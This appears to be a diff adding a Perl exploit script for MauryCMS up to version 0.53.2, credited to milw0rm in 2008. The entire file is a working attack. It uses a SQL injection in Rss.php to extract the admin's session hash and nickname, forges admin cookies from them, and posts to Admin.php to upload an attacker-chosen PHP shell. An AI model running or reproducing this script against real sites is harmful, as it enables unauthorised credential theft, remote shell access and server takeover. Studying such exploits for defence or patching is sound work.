@@ -1,0 +1,108 @@
+#!/usr/bin/perl 
+
+=about
+ 
+   MauryCMS <= 0.53.2 Remote Shell Upload Exploit
+   ----------------------------------------------
+   by athos - staker[at]hotmail[dot]it
+   download on http://cms.maury91.org
+   thnx Osirys
+   
+=cut
+
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+
+my ($http,$post,$user,$pass,@auth,@read,$shell);
+
+my $host = shift @ARGV;
+my $file = shift @ARGV or &usage;
+
+open(FILE,$file) or die("file error!\n");
+
+@read = <FILE>;
+
+foreach(@read) 
+{
+  $shell .= $_;
+}
+
+close(FILE);
+
+&usage if $host !~ /http:\/\/(.+?)$/i && $file !~ /[a-zA-Z](\.php)/i;
+
+
+my @path = split /\//,substr($host,7);
+
+
+$http = new LWP::UserAgent(
+                            agent => "Mozilla/4.5 [en] (Win95; U)",
+                          );
+
+@auth = split(':',get_cookies());
+
+if(not defined($path[1]))
+{
+  $user = qq{_nick=${auth[1]}; path=/; };
+  $pass = qq{_sauth=${auth[0]}; path=/;};
+}
+else
+{
+  $user = qq{/${path[1]}_nick=${auth[1]}; path=/; };
+  $pass = qq{/${path[1]}_sauth=${auth[0]}; path=/;};
+}
+
+
+
+$http->default_header('Cookie' => $user.$pass);
+
+$post = $http->post($host.'/Admin.php',[
+                                         'zone'     => 'Modify',
+                                         'txtfname' => $file,
+                                         'txttext'  => $shell,
+                                       ]);               
+
+if($post->is_success  && $post->as_string =~ /File Scritto/i)
+{
+  print STDOUT "Exploit Successfully!\n";
+  print STDOUT "$host/$file\n";
+  exit;
+}
+else
+{
+  print STDOUT "Exploit Failed!\n";
+  exit;
+}
+
+
+sub get_cookies
+{
+  my ($query,$cookie,$content);
+
+  $query = "/Rss.php?c=-1+union+select+1,concat(sauth,0x3a,nick),".
+           "3,4,5,6,7,8,9+from+mcms_users+where+id=1--";
+              
+ 
+  $cookie = $http->get($host.$query);
+  $content = $cookie->content;
+ 
+  if($cookie->is_success & $content =~ /<title>(.+?)<\/title>/i)
+  {
+    return $1;
+  }
+}
+
+
+sub usage
+{
+  print STDOUT "MauryCMS <= 0.53.2 Remote Shell Upload Exploit\n".
+               "by athos - staker[at]hotmail[dot]it\n".
+               "----------------------------------------------\n".
+               "Usage: perl $0 http://[host] [name_shell.php]\n".
+               "Usage: perl $0 http://localhost/cms shell.php\n";
+  exit;
+}
+
+# milw0rm.com [2008-11-19]
